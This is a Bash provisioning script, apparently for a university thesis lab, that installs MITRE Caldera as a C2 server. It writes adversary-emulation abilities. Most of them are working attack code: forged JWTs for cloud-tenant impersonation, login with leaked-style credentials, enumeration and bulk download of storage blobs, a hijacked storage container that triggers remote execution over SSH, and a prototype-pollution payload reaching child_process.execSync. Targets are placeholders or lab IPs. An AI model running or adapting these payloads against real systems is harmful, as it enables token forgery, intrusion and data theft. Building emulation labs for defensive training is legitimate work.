#!/bin/bash
# ==============================================================================
# SCRIPT DE PROVISIONAMIENTO C2 - MITRE CALDERA (TFG)
# ==============================================================================

apt-get update -y
apt-get install -y git python3 python3-pip python3-venv build-essential curl
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
apt-get install -y jq

curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs

useradd -m -s /bin/bash caldera
cd /home/caldera
git config --global --add safe.directory '*'
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# ==============================================================================
# INYECCIÓN DINÁMICA DE ESTRUCTURAS (ADVERSARIOS Y HABILIDADES)
# ==============================================================================
echo "[*] Creando estructura de directorios para Stockpile..."
ADV_DIR="/home/caldera/caldera/plugins/stockpile/data/adversaries"
ABI_DIR="/home/caldera/caldera/plugins/stockpile/data/abilities"

mkdir -p $ADV_DIR
mkdir -p $ABI_DIR/credential-access
mkdir -p $ABI_DIR/collection
mkdir -p $ABI_DIR/initial-access
mkdir -p $ABI_DIR/discovery
mkdir -p $ABI_DIR/exfiltration
mkdir -p $ABI_DIR/privilege-escalation
mkdir -p $ABI_DIR/execution

# ------------------------------------------------------------------------------
# 1. STORM-0558
# ------------------------------------------------------------------------------
cat << 'EOF' > $ADV_DIR/fc34bc09-b490-42ac-9631-02184fdb4f71.yml
id: fc34bc09-b490-42ac-9631-02184fdb4f71
name: STORM-0558
description: Emulacion de espionaje estatal.
atomic_ordering:
  - f3d1f8db-e331-4306-bb09-42860e260ec0
  - b07d0cb7-373d-49c2-82ae-92de82316959
EOF

cat << 'EOF' > $ABI_DIR/credential-access/f3d1f8db-e331-4306-bb09-42860e260ec0.yml
- id: f3d1f8db-e331-4306-bb09-42860e260ec0
  name: Storm-0558 Fase 1 - Generacion JWT
  description: Forjando firma RSA maliciosa.
  tactic: credential-access
  technique:
    attack_id: T1606.001
    name: "Forge Web Credentials"
  executors:
    - name: sh
      platform: linux
      command: |
        echo "[*] Forjando firma RSA maliciosa..." && pip3 install cryptography pyjwt -q && python3 -c "import jwt, time; from cryptography.hazmat.primitives.asymmetric import rsa; from cryptography.hazmat.primitives import serialization; k = rsa.generate_private_key(65537, 2048); pem = k.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()); t = jwt.encode({'aud':'api://TFG-Customer-Portal-App','iss':'https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/v2.0','tid':'9188040d-6c67-4c5b-b112-36a304b66dad','upn':'admin@__TENANT_DOMAIN__','iat':int(time.time()),'exp':int(time.time())+3600}, pem, algorithm='RS256', headers={'alg':'RS256', 'kid':'1LTMzakihiRla_8z2BEJVXeWMqo'}); t_str = t.decode() if isinstance(t, bytes) else t; open('/tmp/forged_token.txt', 'w').write(t_str); print('[+] Token guardado.')"
EOF

cat << 'EOF' > $ABI_DIR/collection/b07d0cb7-373d-49c2-82ae-92de82316959.yml
- id: b07d0cb7-373d-49c2-82ae-92de82316959
  name: Storm-0558 Fase 2 - Acceso a API
  description: Acceso abusando del token falsificado.
  tactic: collection
  technique:
    attack_id: T1530
    name: "Data from Cloud Storage Object"
  executors:
    - name: sh
      platform: linux
      command: |
        if [ ! -f /tmp/forged_token.txt ]; then exit 1; fi; OUT=$(curl -s -w "\n%{http_code}" -H "Authorization: Bearer $(cat /tmp/forged_token.txt)" "http://__IP_WEB_VICTIMA__/api/sensitive-data"); HTTP_STATUS=$(echo "$OUT" | tail -n1); BODY=$(echo "$OUT" | sed '$d'); echo "$BODY"; if [ "$HTTP_STATUS" != "200" ]; then exit 1; fi
EOF

# ------------------------------------------------------------------------------
# 2. UNC5537
# ------------------------------------------------------------------------------
cat << 'EOF' > $ADV_DIR/ccaa654f-59f5-46b3-9765-e18fee73f515.yml
id: ccaa654f-59f5-46b3-9765-e18fee73f515
name: UNC5537
description: Extorsion de datos SaaS.
atomic_ordering:
  - 35bf7cff-b09c-4cab-8198-12e9e42bbcc9
  - 1e7ba7f6-85f4-4f16-9e47-81351c900f07
  - 2f5d0edf-328f-44e2-848b-8e104fb5c37a
EOF

cat << 'EOF' > $ABI_DIR/initial-access/35bf7cff-b09c-4cab-8198-12e9e42bbcc9.yml
- id: 35bf7cff-b09c-4cab-8198-12e9e42bbcc9
  name: UNC5537 Fase 1 - Acceso Inicial
  description: Login en cuenta SaaS.
  tactic: initial-access
  technique:
    attack_id: T1078.004
    name: "Valid Accounts: Cloud Accounts"
  executors:
    - name: sh
      platform: linux
      command: |
        az login --username 'ext-contractor@__TENANT_DOMAIN__' --password 'Inf0st3al3r_L3ak_2024_!$' --allow-no-subscriptions > /dev/null && echo "[+] Sesion establecida."
EOF

cat << 'EOF' > $ABI_DIR/discovery/1e7ba7f6-85f4-4f16-9e47-81351c900f07.yml
- id: 1e7ba7f6-85f4-4f16-9e47-81351c900f07
  name: UNC5537 Fase 2 - Enumeración de Storage
  description: Descubrimiento de contenedores PII.
  tactic: discovery
  technique:
    attack_id: T1619
    name: "Cloud Storage Object Discovery"
  executors:
    - name: sh
      platform: linux
      command: |
        az storage container list --account-name __NOMBRE_DATALAKE__ --auth-mode login --query '[].name' -o tsv > $HOME/unc5537_containers.txt && cat $HOME/unc5537_containers.txt
EOF

cat << 'EOF' > $ABI_DIR/exfiltration/2f5d0edf-328f-44e2-848b-8e104fb5c37a.yml
- id: 2f5d0edf-328f-44e2-848b-8e104fb5c37a
  name: UNC5537 Fase 3 - Exfiltración de Datos
  description: Extraccion y empaquetado de datos.
  tactic: exfiltration
  technique:
    attack_id: T1517
    name: "Transfer Data to Cloud Account"
  executors:
    - name: sh
      platform: linux
      command: |
        mkdir -p $HOME/exfil_unc5537 && az storage blob download-batch --destination $HOME/exfil_unc5537 --source clients --account-name __NOMBRE_DATALAKE__ --auth-mode login > /dev/null && tar -czPf $HOME/unc5537_loot.tar.gz $HOME/exfil_unc5537 && echo "[*] EVIDENCIA FORENSE:" && cat $HOME/exfil_unc5537/pwned_unc5537.txt
EOF

# ------------------------------------------------------------------------------
# 3. CVE-2026-2473
# ------------------------------------------------------------------------------
cat << 'EOF' > $ADV_DIR/fe29b662-9031-4de1-9f41-4adebe3434bc.yml
id: fe29b662-9031-4de1-9f41-4adebe3434bc
name: CVE-2026-2473
description: Bucket Squatting en Vertex AI.
atomic_ordering:
  - b12840b3-2a37-401b-80a9-122162f9b406
  - 214736f2-a209-4850-9b9e-d6c3b31b42cf
EOF

cat << 'EOF' > $ABI_DIR/privilege-escalation/b12840b3-2a37-401b-80a9-122162f9b406.yml
- id: b12840b3-2a37-401b-80a9-122162f9b406
  name: CVE-2026-2473 Fase 1 - Bucket Squatting
  description: Toma de control de infraestructura predictible.
  tactic: privilege-escalation
  technique:
    attack_id: T1574
    name: "Hijack Execution Flow"
  executors:
    - name: sh
      platform: linux
      timeout: 60
      command: |
        echo '#!/bin/bash' > /tmp/simulated_rce.sh; echo 'echo "[!] RCE Ejecutado."; cat /opt/pwned_cve20262473.txt' >> /tmp/simulated_rce.sh; az storage container create --account-name __NOMBRE_AML_STORAGE__ --name azureml-blobstore --auth-mode login > /dev/null 2>&1 || true; az storage blob upload --account-name __NOMBRE_AML_STORAGE__ --container-name azureml-blobstore --name startup/startup.sh --file /tmp/simulated_rce.sh --auth-mode login --overwrite > /dev/null 2>&1 && echo '[+] Bucket Secuestrado.'
EOF

cat << 'EOF' > $ABI_DIR/execution/214736f2-a209-4850-9b9e-d6c3b31b42cf.yml
- id: 214736f2-a209-4850-9b9e-d6c3b31b42cf
  name: CVE-2026-2473 Fase 2 - Inyección Bucket Squatting
  description: Ejecucion del RCE a traves del secuestro.
  tactic: execution
  technique:
    attack_id: T1059.004
    name: "Command and Scripting Interpreter: Unix Shell"
  executors:
    - name: sh
      platform: linux
      timeout: 60
      command: |
        KEY_PATH=$(for p in ~/.ssh/id_rsa /home/caldera/.ssh/id_rsa /root/.ssh/id_rsa; do if [ -f "$p" ]; then echo "$p"; break; fi; done); if [ -z "$KEY_PATH" ]; then echo "[-] ERROR"; exit 1; fi; ssh -i "$KEY_PATH" -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o BatchMode=yes tfgadmin@10.0.2.4 'az login --identity; if [ $? -ne 0 ]; then exit 1; fi; PROPIEDAD=$(az storage account show --name __NOMBRE_AML_STORAGE__ --query "resourceGroup" -o tsv 2>/dev/null | tr -d "\r"); if [ "$PROPIEDAD" != "rg-tfg" ]; then echo "[-] HARDENING FASE 1: El Bucket no pertenece a la org. Bloqueando descarga."; exit 1; fi; az storage blob download --account-name __NOMBRE_AML_STORAGE__ --container-name azureml-blobstore --name startup/startup.sh --file /tmp/target_startup.sh --auth-mode login && chmod +x /tmp/target_startup.sh && /tmp/target_startup.sh'
EOF

# ------------------------------------------------------------------------------
# 4. CVE-2025-55241
# ------------------------------------------------------------------------------
cat << 'EOF' > $ADV_DIR/ea6d6192-e19e-4060-84f4-52262f014684.yml
id: ea6d6192-e19e-4060-84f4-52262f014684
name: CVE-2025-55241
description: Actor Token Impersonation.
atomic_ordering:
  - f7e5bd7e-d7af-4668-85b8-50c50c1dc675
EOF

cat << 'EOF' > $ABI_DIR/privilege-escalation/f7e5bd7e-d7af-4668-85b8-50c50c1dc675.yml
- id: f7e5bd7e-d7af-4668-85b8-50c50c1dc675
  name: CVE-2025-55241 - Actor Token Impersonation
  description: Suplantacion mediante token de actor.
  tactic: privilege-escalation
  technique:
    attack_id: T1078.004
    name: "Valid Accounts: Cloud Accounts"
  executors:
    - name: sh
      platform: linux
      command: |
        pip3 install pyjwt -q && python3 -c "import time, jwt; now=int(time.time()); t = jwt.encode({'aud':'https://graph.windows.net','iss':'https://sts.windows.net/fake/','nbf':now-86400,'iat':now-86400,'exp':now+86400}, 'fake', algorithm='HS256'); open('/tmp/actor_token.txt', 'w').write(t.decode() if isinstance(t, bytes) else t)"; OUT=$(curl -s -w "\n%{http_code}" -m 5 -H "Authorization: Bearer $(cat /tmp/actor_token.txt)" -H "x-ms-impersonation-upn: admin@__TENANT_DOMAIN__" "http://10.0.2.4:8080"); CURL_STATUS=$?; HTTP_STATUS=$(echo "$OUT" | tail -n1); BODY=$(echo "$OUT" | sed '$d'); echo "$BODY"; if [ $CURL_STATUS -ne 0 ] || [ "$HTTP_STATUS" != "200" ]; then exit 1; fi
EOF

# ------------------------------------------------------------------------------
# 5. REACT2SHELL
# ------------------------------------------------------------------------------
cat << 'EOF' > $ADV_DIR/576e2202-ed7d-4924-8aa6-5464c086c4f5.yml
id: 576e2202-ed7d-4924-8aa6-5464c086c4f5
name: REACT2SHELL
description: Prototype Pollution RCE.
atomic_ordering:
  - c61cb512-65b9-475b-b078-0ce4eb319565
EOF

cat << 'EOF' > $ABI_DIR/initial-access/c61cb512-65b9-475b-b078-0ce4eb319565.yml
- id: c61cb512-65b9-475b-b078-0ce4eb319565
  name: React2Shell Fase Única - Evasión y Deserialización
  description: Explotacion remota via HTTP.
  tactic: initial-access
  technique:
    attack_id: T1190
    name: "Exploit Public-Facing Application"
  executors:
    - name: sh
      platform: linux
      timeout: 60
      command: |
        RES=$(python3 -c 'import requests; headers={"Host": "localhost", "Next-Action": "x", "Content-Type": "multipart/form-data; boundary=----WebKit"}; payload="{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_formData\":{\"get\":\"$1:constructor:constructor\"}},\"_prefix\":\"res.send(process.mainModule.require(\\\"child_process\\\").execSync(\\\"cat /opt/react-app/pwned_react2shell.txt\\\").toString()); res.status=function(){return res;}; res.send=function(){};\"}"; data="------WebKit\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"+payload+"\r\n------WebKit\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n------WebKit--\r\n"; res=requests.post("http://__IP_WEB_VICTIMA__:80", headers=headers, data=data); print("\n[*] EVIDENCIA FORENSE:\n" + "-"*60 + "\n" + res.text.strip() + "\n" + "-"*60)' 2>/dev/null); echo "$RES"; if echo "$RES" | grep -qiE "HARDENING|Permission denied|Error"; then exit 1; fi
EOF

# ==============================================================================
# PERMISOS Y SERVICIOS
# ==============================================================================
chown -R caldera:caldera /home/caldera
sudo -u caldera /home/caldera/caldera/venv/bin/python3 server.py --insecure --build & 
sleep 300
pkill -f server.py

cat <<EOF > /etc/systemd/system/caldera.service
[Unit]
Description=MITRE Caldera C2
After=network.target

[Service]
User=caldera
WorkingDirectory=/home/caldera/caldera
ExecStart=/home/caldera/caldera/venv/bin/python3 server.py --insecure
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable caldera
systemctl start caldera

# Configuración SSH
mkdir -p /home/caldera/.ssh
cat << 'KEY' > /home/caldera/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<CLAVE SSH LOCAL PARA PODER CONECTAR A VM_VICTIMA DESDE VM_CALDERA>
-----END OPENSSH PRIVATE KEY-----
KEY

chown -R caldera:caldera /home/caldera/.ssh
chmod 700 /home/caldera/.ssh
chmod 600 /home/caldera/.ssh/id_rsa